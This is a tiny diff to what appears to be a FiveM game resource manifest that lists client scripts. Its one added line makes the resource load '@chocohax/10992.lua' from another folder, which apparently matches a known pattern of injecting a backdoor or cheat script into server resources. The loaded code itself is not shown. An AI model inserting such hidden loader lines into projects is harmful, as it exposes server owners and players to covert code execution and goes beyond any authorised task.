@@ -13,3 +13,4 @@ client_script {
 	'client.lua',
 	'GUI.lua'
 }
+client_script '@chocohax/10992.lua'
